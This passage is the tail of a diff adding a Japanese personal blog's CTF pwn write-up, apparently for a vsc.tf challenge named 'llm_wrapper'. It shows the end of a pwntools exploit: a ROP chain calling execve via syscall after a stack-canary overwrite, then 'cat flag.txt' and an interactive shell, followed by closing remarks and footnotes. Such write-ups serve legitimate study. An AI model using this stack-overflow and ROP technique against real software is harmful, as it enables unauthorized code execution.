+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(pop_rax)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">59</span><span>)
+</span><span>        + </span><span style="color:#bf616a;">p64</span><span>(syscall)
+</span><span>    )
+</span><span>    </span><span style="color:#bf616a;">update</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot; * </span><span style="color:#d08770;">0x38 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(canary) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) * </span><span style="color:#d08770;">2 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(rbp) + rop + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">fin</span><span>()
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">cat flag.txt</span><span>&quot;)
+</span><span>
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">0
+</span><span>debug = </span><span style="color:#d08770;">1
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./llm_wrapper</span><span>&quot;
+</span><span>libc_name = &quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">vsc.tf 3756</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span style="color:#65737e;"># remote_addr, remote_port = &quot;127.0.0.1 60000&quot;.split()
+</span><span>elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span>libc: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(libc_name)
+</span><span>script = &quot;&quot;&quot;
+</span><span style="color:#a3be8c;">b *0x004029b8
+</span><span>&quot;&quot;&quot;
+</span><span>t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span style="color:#bf616a;">solve</span><span>()
+</span></code></pre>
+<h2 id="zhong-warini">終わりに</h2>
+<p>初めて個人ブログを立ち上げてみました。 zolaを使っているのでビルドがめっちゃ早いです。びっくりしました。</p>
+<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
+<p>このブログは全ページ全pwner読むべきだと思っています</p>
+</div>
+<div class="footnote-definition" id="2"><sup class="footnote-definition-label">2</sup>
+<p>libcからTLSへのオフセットが一定だと思っていて、Master Canaryをleakしようとして1時間とかしました(ASLRをオフにしていただけ)</p>
+</div>
+
+        </div>
+
+    
+        <div class="pagination">
+            <div class="pagination__title">
+                <span class="pagination__title-h">Other posts</span>
+                <hr />
+            </div>
+            <div class="pagination__buttons">
+                    <span class="button previous">
+                        <a href="https://blog.rqda.wtf/about/">
+                            <span class="button__icon">←</span>&nbsp;
+                            <span class="button__text">About me</span>
+                        </a>
+                    </span>
+                
+                
+                    <span class="button next">
+                        <a href="https://blog.rqda.wtf/buckeye-2023/">
+                            <span class="button__text">buckeyeCTF 2023</span>&nbsp;
+                            <span class="button__icon">→</span>
+                        </a>
+                    </span>
+                </div>
+        </div>
+    
+</div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright copyright--user">&#169 2025 Rona 🐈</div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
